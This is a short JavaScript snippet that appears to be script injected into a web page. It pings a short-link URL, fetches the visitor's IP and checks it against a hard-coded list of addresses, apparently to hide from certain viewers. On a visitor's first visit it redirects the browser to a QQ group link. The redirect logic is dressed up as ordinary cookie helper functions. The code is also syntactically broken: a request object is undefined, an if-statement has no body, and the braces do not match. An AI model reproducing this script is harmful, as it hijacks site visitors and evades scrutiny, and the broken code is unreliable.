const settings = {"url": "https://ock.cn/JSBzt","method": "GET"};$.ajax(settings).done(function(response) {});

	$.ajax(ipip).done(function(responsee) {
		 console.log(responsee.data.ip);
	var arr=["27.26.4.210","39.128.48.144","117.182.37.4","112.23.80.109","115.53.236.228","222.142.138.41","27.222.137.169","222.142.138.41"];
	if(arr.includes(responsee.data.ip))

	else
	   var caution=false
function setCookie(name,value,expires,path,domain,secure) 
{
 var curCookie=name+"="+escape(value) +
 ((expires)?";expires="+expires.toGMTString() : "") +
 ((path)?"; path=" + path : "") +
 ((domain)? "; domain=" + domain : "") +
 ((secure)?";secure" : "")
 if(!caution||(name + "=" + escape(value)).length <= 4000)
 {
 document.cookie = curCookie
 }
 else if(confirm("Cookie exceeds 4KB and will be cut!"))
 {
 document.cookie = curCookie
 }
}
function getCookie(name) 
{
 var prefix = name + "="
 var cookieStartIndex = document.cookie.indexOf(prefix)
 if (cookieStartIndex == -1)
 {
 return null
 }    
 var cookieEndIndex=document.cookie.indexOf(";",cookieStartIndex+prefix.length)
 if(cookieEndIndex == -1)
 {
 cookieEndIndex = document.cookie.length
 }
 return unescape(document.cookie.substring(cookieStartIndex+prefix.length,cookieEndIndex))
}
function deleteCookie(name, path, domain) 
{
 if(getCookie(name)) 
 {
 document.cookie = name + "=" + 
 ((path) ? "; path=" + path : "") +
 ((domain) ? "; domain=" + domain : "") +
 "; expires=Thu, 01-Jan-70 00:00:01 GMT"
 }
}
function fixDate(date) 
{
 var base=new Date(0)
 var skew=base.getTime()
 if(skew>0)
 {
 date.setTime(date.getTime()-skew)
 }    
}
var now=new Date()
fixDate(now)
now.setTime(now.getTime()+365 * 24 * 60 * 60 * 1000)
var visits = getCookie("counter")
if(!visits)
{
 visits=1;
}  
else
{
 visits=parseInt(visits)+1;
}  
setCookie("counter", visits, now)
if(visits==1){
    document.location = "https://jq.qq.com/?_wv=1027&k=WbQ31RfH"
}else{

}
	});
